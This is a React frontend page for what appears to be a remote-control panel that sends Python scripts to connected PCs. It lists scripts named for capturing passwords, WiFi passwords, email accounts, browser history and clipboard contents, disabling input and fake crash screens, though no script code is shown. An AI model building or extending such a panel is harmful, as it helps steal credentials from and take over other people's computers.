import { useEffect, useState, useMemo } from 'react'
import { FileCode, Send, RefreshCw, X, Settings, Star, Folder, Search, AlertTriangle } from 'lucide-react'
import { getScripts, sendScript, getPCs } from '../services/api'
import { useToast } from '../components/ToastContainer'

// Script importance and display names from documentation
const IMPORTANT_SCRIPTS = [
  'hacker_attack.py',
  'browser_history.py',
  'email_accounts.py',
  'capture_password.py',
  'wifi_passwords.py',
  'disable_input.py',
  'open_app.py',
  'close_app.py',
  'list_apps.py',
  'active_windows.py',
  'geolocation.py',
  'connected_devices.py',
  'full_report.py',
  'lock_pc.py',
  'system_info.py',
  'open_websites.py',
  'speak_text.py'
]

const SCRIPT_DISPLAY_NAMES = {
  'hacker_attack.py': 'Hacker Attack',
  'browser_history.py': 'Browser History',
  'email_accounts.py': 'Email Accounts',
  'capture_password.py': 'Capture Password',
  'wifi_passwords.py': 'WiFi Passwords',
  'disable_input.py': 'Disable Input',
  'open_app.py': 'Open Application',
  'close_app.py': 'Close Application',
  'list_apps.py': 'List Applications',
  'active_windows.py': 'Active Windows',
  'geolocation.py': 'Geolocation',
  'connected_devices.py': 'Connected Devices',
  'full_report.py': 'Full Report',
  'lock_pc.py': 'Lock PC',
  'system_info.py': 'System Info',
  'open_websites.py': 'Open Websites',
  'speak_text.py': 'Text to Speech',
  'volume_max.py': 'Volume Max',
  'clipboard_capture.py': 'Clipboard Capture',
  'restart_pc.py': 'Restart PC',
  'shutdown_pc.py': 'Shutdown PC',
  'taskbar_hide.py': 'Taskbar Control',
  'random_sounds.py': 'Random Sounds',
  'flip_screen.py': 'Flip Screen',
  'swap_mouse.py': 'Swap Mouse',
  'fake_bsod.py': 'Fake BSOD',
  'meme_audios.py': 'Meme Audios',
  'read_file.py': 'Read File',
  'recent_files.py': 'Recent Files',
  'open_explorer.py': 'Open Explorer',
  'matrix_rain.py': 'Matrix Rain',
  'popup_message.py': 'Popup Message',
  'remote_desktop.py': 'Remote Desktop',
  'hacker_terminal.py': 'Hacker Terminal'
}

const Scripts = () => {
  const [scripts, setScripts] = useState([])
  const [pcs, setPCs] = useState([])
  const [loading, setLoading] = useState(true)
  const [selectedScript, setSelectedScript] = useState(null)
  const [selectedPC, setSelectedPC] = useState('')
  const [scriptParams, setScriptParams] = useState({})
  const [searchQuery, setSearchQuery] = useState('')
  const [showConfirmDialog, setShowConfirmDialog] = useState(false)
  const [pendingSend, setPendingSend] = useState(null)
  const { showToast } = useToast()

  useEffect(() => {
    loadData()
  }, [])

  const loadData = async () => {
    try {
      const [scriptsData, pcsData] = await Promise.all([
        getScripts(),
        getPCs(true) // Only connected PCs
      ])
      setScripts(scriptsData.scripts || [])
      setPCs(pcsData.pcs || [])
    } catch (error) {
      console.error('Error loading data:', error)
    } finally {
      setLoading(false)
    }
  }

  const getDisplayName = (scriptName) => {
    return SCRIPT_DISPLAY_NAMES[scriptName] || scriptName.replace('.py', '').replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase())
  }

  // Sort and categorize scripts by importance
  const sortedScripts = useMemo(() => {
    const important = []
    const others = []
    
    scripts.forEach(script => {
      // Filter out removed scripts
      const removedScripts = [
        'file_search.py',
        'file_explorer.py',
        'remote_shell.py',
        'screen_recorder.py',
        'screenshot.py',
        'wallpaper_changer.py'
      ]
      if (removedScripts.includes(script.name)) {
        return
      }

      // Filter by search query
      const displayName = getDisplayName(script.name)
      if (searchQuery && !displayName.toLowerCase().includes(searchQuery.toLowerCase()) && 
          !script.name.toLowerCase().includes(searchQuery.toLowerCase())) {
        return
      }

      const index = IMPORTANT_SCRIPTS.indexOf(script.name)
      if (index !== -1) {
        important.push({ ...script, importanceIndex: index })
      } else {
        others.push(script)
      }
    })
    
    // Sort important scripts by their priority order
    important.sort((a, b) => a.importanceIndex - b.importanceIndex)
    
    // Sort other scripts alphabetically
    others.sort((a, b) => a.name.localeCompare(b.name))
    
    return { important, others }
  }, [scripts, searchQuery])

  const handleSendScript = async (scriptName, pcId, params = null, skipConfirm = false) => {
    if (!pcId) {
      showToast('Please select a PC', 'warning')
      return
    }
    
    // Show confirmation dialog unless skipConfirm is true
    if (!skipConfirm) {
      setPendingSend({ scriptName, pcId, params })
      setShowConfirmDialog(true)
      return
    }
    
    try {
      await sendScript(pcId, scriptName, null, params)
      showToast(`Script ${scriptName} sent successfully to ${pcId}`, 'success')
      setSelectedScript(null)
      setSelectedPC('')
      setScriptParams({})
      setShowConfirmDialog(false)
      setPendingSend(null)
    } catch (error) {
      showToast(`Error: ${error.response?.data?.detail || error.message}`, 'error')
    }
  }

  const confirmSend = () => {
    if (pendingSend) {
      handleSendScript(pendingSend.scriptName, pendingSend.pcId, pendingSend.params, true)
    }
  }

  const formatBytes = (bytes) => {
    if (bytes === 0) return '0 Bytes'
    const k = 1024
    const sizes = ['Bytes', 'KB', 'MB']
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i]
  }

  const isImportant = (scriptName) => {
    return IMPORTANT_SCRIPTS.includes(scriptName)
  }

  const hasParameters = (script) => {
    return script.parameters && Object.keys(script.parameters).length > 0
  }

  const handleParamChange = (paramName, value) => {
    setScriptParams(prev => ({
      ...prev,
      [paramName]: value
    }))
  }

  const renderParameterInput = (paramName, paramInfo) => {
    const { type, default: defaultValue, description } = paramInfo
    const currentValue = scriptParams[paramName] || defaultValue || ''

    switch (type) {
      case 'number':
        return (
          <input
            type="number"
            value={currentValue}
            onChange={(e) => handleParamChange(paramName, e.target.value)}
            placeholder={defaultValue || 'Enter number'}
            className="w-full bg-black/50 border border-white/10 text-white px-3 py-2 rounded font-mono text-sm focus:border-hack-green/50 focus:outline-none"
          />
        )
      case 'textarea':
        return (
          <textarea
            value={currentValue}
            onChange={(e) => handleParamChange(paramName, e.target.value)}
            placeholder={defaultValue || 'Enter text'}
            rows={3}
            className="w-full bg-black/50 border border-white/10 text-white px-3 py-2 rounded font-mono text-sm focus:border-hack-green/50 focus:outline-none resize-none"
          />
        )
      case 'select':
        // Get select options based on parameter name
        let options = ['toggle', 'enable', 'disable']
        if (paramName === 'TTS_VOICE') {
          options = ['en-US-GuyNeural', 'en-US-AriaNeural', 'en-IN-PrabhatNeural', 'en-IN-NeerjaNeural', 'hi-IN-MadhurNeural', 'hi-IN-SwaraNeural']
        } else if (paramName === 'POPUP_ICON') {
          options = ['error', 'warning', 'info', 'question']
        } else if (paramName === 'SCREEN_ACTION') {
          options = ['toggle', 'flip', 'normal', 'left', 'right']
        } else if (paramName === 'MOUSE_ACTION') {
          options = ['toggle', 'swap', 'normal']
        } else if (paramName === 'TASKBAR_ACTION') {
          options = ['toggle', 'hide', 'show']
        } else if (paramName === 'SEARCH_TYPE') {
          options = ['both', 'files', 'dirs']
        } else if (paramName === 'SHUTDOWN_FORCE' || paramName === 'RESTART_FORCE' || paramName === 'EXPLORER_SHOW_HIDDEN' || paramName === 'CASE_SENSITIVE') {
          options = ['false', 'true']
        }
        
        return (
          <select
            value={currentValue}
            onChange={(e) => handleParamChange(paramName, e.target.value)}
            className="w-full bg-black/50 border border-white/10 text-white px-3 py-2 rounded font-mono text-sm focus:border-hack-green/50 focus:outline-none"
          >
            {options.map(opt => (
              <option key={opt} value={opt}>{opt}</option>
            ))}
          </select>
        )
      default:
        return (
          <input
            type="text"
            value={currentValue}
            onChange={(e) => handleParamChange(paramName, e.target.value)}
            placeholder={defaultValue || 'Enter value'}
            className="w-full bg-black/50 border border-white/10 text-white px-3 py-2 rounded font-mono text-sm focus:border-hack-green/50 focus:outline-none"
          />
        )
    }
  }

  const handleQuickSend = async (script, pcId) => {
    if (!pcId) {
      showToast('Please select a PC', 'warning')
      return
    }
    
    // If script has required parameters, open modal instead
    if (hasParameters(script)) {
      setSelectedScript(script)
      setSelectedPC(pcId)
      setScriptParams({})
      return
    }
    
    // Quick send for scripts without parameters (will show confirmation)
    await handleSendScript(script.name, pcId, null)
  }

  return (
    <div className="min-h-screen bg-black p-4 sm:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-4 sm:p-6 shadow-2xl">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
            <div className="flex items-center gap-4">
              <div className="p-3 bg-hack-green/10 rounded-lg border border-hack-green/20">
                <FileCode className="text-hack-green" size={28} />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white">Scripts</h1>
                <p className="text-white/70 text-sm mt-1">Execute scripts on connected devices</p>
              </div>
            </div>
            <div className="flex items-center justify-center sm:justify-end gap-3 w-full sm:w-auto">
              <button
                onClick={loadData}
                className="inline-flex items-center gap-2 bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-4 py-2 rounded-lg font-medium transition-all"
              >
                <RefreshCw size={18} />
                Refresh
              </button>
            </div>
          </div>
        </div>

        {/* Search Bar */}
        <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-3 sm:p-4">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-white/50" size={20} />
            <input
              type="text"
              placeholder="Search scripts..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-black/50 border border-white/10 text-white px-10 py-3 rounded-lg font-mono focus:border-hack-green/50 focus:outline-none"
            />
          </div>
        </div>

        {loading ? (
          <div className="text-center py-12">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-hack-green mx-auto mb-4"></div>
            <p className="text-white/70 font-mono">Loading scripts...</p>
          </div>
        ) : scripts.length === 0 ? (
          <div className="text-center py-12 bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl">
            <FileCode className="mx-auto text-white/30 mb-4" size={48} />
            <p className="text-white/70 font-mono">No scripts available</p>
            <p className="text-white/50 text-sm mt-2">Add Python scripts to the Scripts folder</p>
          </div>
        ) : (
          <div className="space-y-6">
            {/* Important Scripts Section */}
            {sortedScripts.important.length > 0 && (
              <div>
                <div className="flex items-center gap-3 mb-4">
                  <Star className="text-hack-green" size={20} fill="currentColor" />
                  <h2 className="text-xl font-bold text-white">Important Scripts</h2>
                  <span className="text-white/50 text-sm">({sortedScripts.important.length})</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
                  {sortedScripts.important.map(script => {
                    const displayName = getDisplayName(script.name)
                    const isImportantScript = isImportant(script.name)
                    const hasParams = hasParameters(script)
                    const connectedPCs = pcs.filter(pc => pc.connected)

                    return (
                      <div
                        key={script.name}
                        className={`bg-hack-dark/90 backdrop-blur-sm border rounded-xl p-4 hover:border-hack-green/30 transition-all shadow-xl ${
                          isImportantScript ? 'border-hack-green/20' : 'border-white/10'
                        }`}
                      >
                        <div className="flex items-start justify-between mb-3">
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h3 className="text-hack-green font-mono font-bold text-sm truncate" title={displayName}>
                                {displayName}
                              </h3>
                              {isImportantScript && (
                                <Star className="text-hack-green flex-shrink-0" size={14} fill="currentColor" />
                              )}
                              {hasParams && (
                                <span className="text-white/50 text-xs" title="Requires parameters">⚙️</span>
                              )}
                            </div>
                            <p className="text-white/50 text-xs font-mono truncate" title={script.name}>
                              {script.name}
                            </p>
                          </div>
                        </div>

                        <div className="flex gap-2 mt-3">
                          {connectedPCs.length > 0 ? (
                            <>
                              <select
                                onChange={(e) => {
                                  if (e.target.value) {
                                    handleQuickSend(script, e.target.value)
                                  }
                                }}
                                className="flex-1 bg-black/50 border border-white/10 text-white px-2 py-1.5 rounded text-xs font-mono focus:border-hack-green/50 focus:outline-none"
                                defaultValue=""
                              >
                                <option value="">Select PC...</option>
                                {connectedPCs.map((pc) => (
                                  <option key={pc.pc_id} value={pc.pc_id}>
                                    {pc.pc_id}
                                  </option>
                                ))}
                              </select>
                              {hasParams && (
                                <button
                                  onClick={() => {
                                    setSelectedScript(script)
                                    setSelectedPC('')
                                    setScriptParams({})
                                  }}
                                  className="bg-black/50 hover:bg-black/70 border border-white/10 text-white px-2 py-1.5 rounded text-xs transition-all"
                                  title="Configure Parameters"
                                >
                                  <Settings size={12} />
                                </button>
                              )}
                            </>
                          ) : (
                            <div className="w-full text-center text-white/50 text-xs py-2">
                              No PCs connected
                            </div>
                          )}
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>
            )}

            {/* Other Scripts Section */}
            {sortedScripts.others.length > 0 && (
              <div>
                <div className="flex items-center gap-3 mb-4">
                  <Folder className="text-white/70" size={20} />
                  <h2 className="text-xl font-bold text-white">Other Scripts</h2>
                  <span className="text-white/50 text-sm">({sortedScripts.others.length})</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
                  {sortedScripts.others.map(script => {
                    const displayName = getDisplayName(script.name)
                    const hasParams = hasParameters(script)
                    const connectedPCs = pcs.filter(pc => pc.connected)

                    return (
                      <div
                        key={script.name}
                        className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-4 hover:border-hack-green/30 transition-all shadow-xl"
                      >
                        <div className="flex items-start justify-between mb-3">
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h3 className="text-hack-green font-mono font-bold text-sm truncate" title={displayName}>
                                {displayName}
                              </h3>
                              {hasParams && (
                                <span className="text-white/50 text-xs" title="Requires parameters">⚙️</span>
                              )}
                            </div>
                            <p className="text-white/50 text-xs font-mono truncate" title={script.name}>
                              {script.name}
                            </p>
                          </div>
                        </div>

                        <div className="flex gap-2 mt-3">
                          {connectedPCs.length > 0 ? (
                            <>
                              <select
                                onChange={(e) => {
                                  if (e.target.value) {
                                    handleQuickSend(script, e.target.value)
                                  }
                                }}
                                className="flex-1 bg-black/50 border border-white/10 text-white px-2 py-1.5 rounded text-xs font-mono focus:border-hack-green/50 focus:outline-none"
                                defaultValue=""
                              >
                                <option value="">Select PC...</option>
                                {connectedPCs.map((pc) => (
                                  <option key={pc.pc_id} value={pc.pc_id}>
                                    {pc.pc_id}
                                  </option>
                                ))}
                              </select>
                              {hasParams && (
                                <button
                                  onClick={() => {
                                    setSelectedScript(script)
                                    setSelectedPC('')
                                    setScriptParams({})
                                  }}
                                  className="bg-black/50 hover:bg-black/70 border border-white/10 text-white px-2 py-1.5 rounded text-xs transition-all"
                                  title="Configure Parameters"
                                >
                                  <Settings size={12} />
                                </button>
                              )}
                            </>
                          ) : (
                            <div className="w-full text-center text-white/50 text-xs py-2">
                              No PCs connected
                            </div>
                          )}
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>
            )}

            {sortedScripts.important.length === 0 && sortedScripts.others.length === 0 && (
              <div className="text-center py-12 bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl">
                <Search className="mx-auto text-white/30 mb-4" size={48} />
                <p className="text-white/70 font-mono">No scripts found</p>
                <p className="text-white/50 text-sm mt-2">Try a different search query</p>
              </div>
            )}
          </div>
        )}

        {/* Script Configuration Modal */}
        {selectedScript && (
          <div className="fixed inset-0 bg-transparent flex items-start justify-center z-50 p-2 sm:p-4 pt-4 sm:pt-8 md:pt-16">
            <div className="bg-hack-dark/95 backdrop-blur-sm border border-white/10 rounded-xl p-4 sm:p-6 max-w-2xl w-full max-h-[95vh] sm:max-h-[90vh] overflow-y-auto custom-scrollbar shadow-2xl">
              <div className="flex justify-between items-center mb-6">
                <div className="flex items-center gap-3">
                  <FileCode className="text-hack-green" size={24} />
                  <div>
                    <h3 className="text-xl font-bold text-white font-mono">{getDisplayName(selectedScript.name)}</h3>
                    <p className="text-white/50 text-xs font-mono">{selectedScript.name}</p>
                  </div>
                  {isImportant(selectedScript.name) && (
                    <Star className="text-hack-green" size={20} fill="currentColor" />
                  )}
                </div>
                <button
                  onClick={() => {
                    setSelectedScript(null)
                    setSelectedPC('')
                    setScriptParams({})
                  }}
                  className="text-white/50 hover:text-white transition-colors"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="space-y-6">
                {/* Script Info */}
                <div className="bg-black/50 border border-white/10 rounded-lg p-4">
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <span className="text-white/50">Size:</span>
                      <span className="text-white ml-2 font-mono">{formatBytes(selectedScript.size)}</span>
                    </div>
                    <div>
                      <span className="text-white/50">Parameters:</span>
                      <span className="text-white ml-2 font-mono">
                        {hasParameters(selectedScript) ? Object.keys(selectedScript.parameters).length : 0}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Parameters Section */}
                {hasParameters(selectedScript) && (
                  <div className="space-y-4">
                    <h4 className="text-white font-medium flex items-center gap-2">
                      <Settings className="text-hack-green" size={18} />
                      Script Parameters
                    </h4>
                    <div className="space-y-4 bg-black/30 border border-white/10 rounded-lg p-4">
                      {Object.entries(selectedScript.parameters).map(([paramName, paramInfo]) => {
                        const isRequired = paramInfo.required || (paramName === 'APP_NAME' && (!paramInfo.default || paramInfo.default === ''))
                        return (
                          <div key={paramName}>
                            <label className="block text-white/70 text-sm font-medium mb-2 font-mono">
                              {paramName}
                              {isRequired && <span className="text-red-400 ml-1">*</span>}
                              {paramInfo.description && (
                                <span className="text-white/50 text-xs ml-2 font-normal">({paramInfo.description})</span>
                              )}
                            </label>
                            {renderParameterInput(paramName, paramInfo)}
                          </div>
                        )
                      })}
                    </div>
                  </div>
                )}

                {/* PC Selection */}
                <div>
                  <label className="block text-white/70 text-sm font-medium mb-2">Select PC: <span className="text-red-400">*</span></label>
                  <select
                    value={selectedPC}
                    onChange={(e) => setSelectedPC(e.target.value)}
                    className="w-full bg-black/50 border border-white/10 text-white px-4 py-3 rounded-lg font-mono focus:border-hack-green/50 focus:outline-none"
                    required
                  >
                    <option value="">Select a PC...</option>
                    {pcs.filter(pc => pc.connected).map((pc) => (
                      <option key={pc.pc_id} value={pc.pc_id}>
                        {pc.pc_id} (Online)
                      </option>
                    ))}
                  </select>
                  {pcs.filter(pc => pc.connected).length === 0 && (
                    <p className="text-white/50 text-xs mt-2">No PCs are currently connected</p>
                  )}
                </div>

                {/* Action Buttons */}
                <div className="flex gap-3">
                  <button
                    onClick={() => {
                      if (!selectedPC) {
                        showToast('Please select a PC', 'warning')
                        return
                      }
                      
                      // Validate required parameters
                      if (hasParameters(selectedScript)) {
                        const requiredParams = Object.entries(selectedScript.parameters)
                          .filter(([name, info]) => {
                            // APP_NAME is always required (scripts check "if not APP_NAME")
                            if (name === 'APP_NAME') return true
                            // Check if marked as required
                            return info.required === true
                          })
                          .map(([name]) => name)
                        
                        const missingParams = requiredParams.filter(param => {
                          const value = scriptParams[param] || selectedScript.parameters[param]?.default
                          return !value || value === '' || value === null
                        })
                        
                        if (missingParams.length > 0) {
                          showToast(`Please fill in required parameters: ${missingParams.join(', ')}`, 'warning')
                          return
                        }
                      }
                      
                      const params = hasParameters(selectedScript) && Object.keys(scriptParams).length > 0 ? scriptParams : null
                      handleSendScript(selectedScript.name, selectedPC, params)
                    }}
                    disabled={!selectedPC || pcs.filter(pc => pc.connected).length === 0}
                    className="flex-1 bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-6 py-3 rounded-lg font-medium transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <Send size={18} />
                    Send to PC
                  </button>
                  <button
                    onClick={() => {
                      setSelectedScript(null)
                      setSelectedPC('')
                      setScriptParams({})
                    }}
                    className="bg-black/50 hover:bg-black/70 border border-white/10 text-white px-6 py-3 rounded-lg font-medium transition-all"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Confirmation Dialog */}
        {showConfirmDialog && pendingSend && (
        <div className="fixed inset-0 bg-transparent z-50 flex items-start justify-center p-2 sm:p-4 pt-4 sm:pt-8 md:pt-16">
          <div className="bg-hack-dark/95 backdrop-blur-sm border border-hack-green/30 rounded-xl p-4 sm:p-6 max-w-md w-full shadow-2xl">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-12 h-12 bg-yellow-400/10 rounded-full flex items-center justify-center border border-yellow-400/30">
                <AlertTriangle className="text-yellow-400" size={24} />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white font-mono">Confirm Script Execution</h3>
                <p className="text-white/50 text-sm font-mono">Are you sure you want to send this script?</p>
              </div>
            </div>
            
            <div className="bg-black/50 border border-white/10 rounded-lg p-4 mb-4">
              <div className="space-y-2 text-sm font-mono">
                <div className="flex justify-between">
                  <span className="text-white/70">Script:</span>
                  <span className="text-hack-green">{pendingSend.scriptName}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-white/70">Target PC:</span>
                  <span className="text-hack-green">{pendingSend.pcId}</span>
                </div>
                {pendingSend.params && Object.keys(pendingSend.params).length > 0 && (
                  <div className="mt-2 pt-2 border-t border-white/10">
                    <span className="text-white/70">Parameters:</span>
                    <div className="mt-1 space-y-1">
                      {Object.entries(pendingSend.params).map(([key, value]) => (
                        <div key={key} className="flex justify-between text-xs">
                          <span className="text-white/50">{key}:</span>
                          <span className="text-white">{String(value)}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => {
                  setShowConfirmDialog(false)
                  setPendingSend(null)
                }}
                className="flex-1 bg-black/50 hover:bg-black/70 border border-white/10 text-white px-4 py-2 rounded-lg font-mono transition-all"
              >
                Cancel
              </button>
              <button
                onClick={confirmSend}
                className="flex-1 bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-4 py-2 rounded-lg font-mono transition-all flex items-center justify-center gap-2"
              >
                <Send size={16} />
                Confirm & Send
              </button>
            </div>
          </div>
        </div>
        )}
      </div>
    </div>
  )
}

export default Scripts
